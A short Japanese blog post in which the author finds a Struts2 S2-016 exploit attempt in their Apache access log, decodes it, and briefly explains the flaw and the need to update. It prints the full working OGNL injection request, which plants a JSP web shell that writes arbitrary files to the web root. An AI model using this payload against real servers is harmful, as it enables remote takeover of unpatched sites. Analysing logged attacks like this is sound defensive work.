---
title: apacheのaccess_logにjavaのソースコードみたいなアクセスが記録されていた。(Struts2の脆弱性S2-016への攻撃)
pubtime: 2015-07-01T16:04:00+09:00
tags: [Web, Apache, Java, セキュリティ]
description: 自宅サーバで動かしているApacheに対してStruts2の脆弱性「S2-016」を悪用しようとする攻撃が来ていたので、その内容を調べてみました。
---

さっきの[apache killerの話](/blog/2015/07/python-make-apache-killer)を書いたあとでapacheのアクセスログを見ていたら、こんなアクセスが。
```
xx.xx.xx.xx [01/Jul/2015:03:09:11 +0900] "GET /index.php?redirect:$%%7b%%2523req%%253d%%2523context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%%2523res%%253d%%2523context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%%2523res.getWriter().println(%%2522okokok%%2522),%%2523res.getWriter().flush(),%%2523res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%%2523req.getRealPath(%%2522/%%2522)%%252b%%2522lndex.jsp%%2522)).append(%%2523req.getParameter(%%2522shell%%2522)).close()%%7d&shell=%%253C%%2525if(request.getParameter(%%2522f%%2522)!%%253Dnull)(new%%2520java.io.FileOutputStream(application.getRealPath(%%2522%%252F%%2522)%%252Brequest.getParameter(%%2522f%%2522))).write(request.getParameter(%%2522t%%2522).getBytes())%%253B%%2525%%253E%%253Ca%%2520href%%253D%%2522One_OK%%2522%%253E%%253C%%252Fa%%253E HTTP/1.1" 404 2583 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"
```
なんじゃこりゃ。むっちゃ長い。

どうもプログラムのコードをそのまんま突っ込んであるようなので、バラしてみました。
```
redirect:
    ${
        #req = #context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),
        #res = #context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),
        #res.getWriter().println("okokok"),
        #res.getWriter().flush(),
        #res.getWriter().close(),
        new java.io.BufferedWriter(
            new java.io.FileWriter(
                #req.getRealPath("/") + "lndex.jsp"
            )
        ).append(#req.getParameter("shell")).close()
    }
    &shell = <%%
        if(request.getParameter("f") != null)
            (
                new java.io.FileOutputStream(application.getRealPath("/") + request.getParameter("f"))
            ).write(request.getParameter("t").getBytes());
    %%>
    <a href="One_OK"></a>
```
こんな感じになった。
javaだよjava。javaが埋めこまれている。

調べてみると、どうやら**Sturts2**とやらが関連するようです？
Sturts2というのはjavaでwebアプリケーションを記述するためのフレームワークとのこと。Apacheが作っているらしい。
で、今回問題になるのは*S2-016*という脆弱性。[Apache Struts 2 DocumentationのS2-016のページ](http://struts.apache.org/docs/s2-016.html)を見てみると、確かに似たような雰囲気のURIのサンプルが載っている。

脆弱性の内容としては、クエリに`redirect: `から始まる何かを書いたURIでGETすると、任意のソースを実行できてしまう、というもののようです。
バラしたURIを上に書きましたが、Javaのコードをそのまんま書いて、そのまんま実行するっぽい。
うーむ、くわばらくわばら。

影響をうけるのはStrutsの2.0.0から2.3.15とのこと。
Struts2を利用しているのなら要アップデート、ですかね。

---

参考：
- [Tomcat Files Getting uploaded - Security Loophole - Stack Overflow](http://stackoverflow.com/questions/21104956/tomcat-files-getting-uploaded-security-loophole)
- [Apache Struts の脆弱性 (S2-016) に関する注意喚起](https://www.jpcert.or.jp/at/2013/at130033.html)
